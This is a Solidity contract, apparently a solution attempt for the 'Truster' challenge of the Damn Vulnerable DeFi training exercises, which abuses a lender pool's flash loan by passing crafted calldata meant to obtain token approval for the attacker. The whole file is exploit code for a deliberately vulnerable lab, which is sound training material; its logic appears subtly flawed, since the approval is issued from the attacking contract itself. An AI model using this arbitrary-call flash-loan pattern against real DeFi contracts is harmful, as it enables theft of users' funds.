// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title AttackTruster
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackTruster {

    TrusterLenderPool private immutable pool;
    address private immutable owner;

    constructor(address poolAddress) {
        pool = TrusterLenderPool(poolAddress);
        owner = msg.sender;
    }

    function exploit(address token, uint256 amount) external {
        console.logBytes(msg.data);
        console.log(token);
        console.log(amount);
        IERC20(token).approve(owner, amount);
    }
    
    function executeFlashLoan(address token, uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        // bytes memory data = abi.encodeWithSignature('IERC20(token).approve(address,uint256)', owner, amount);
        bytes memory data = abi.encodeWithSignature('exploit(address,uint256)', token, amount);
        pool.flashLoan(0, owner, address(this), data);
    }
}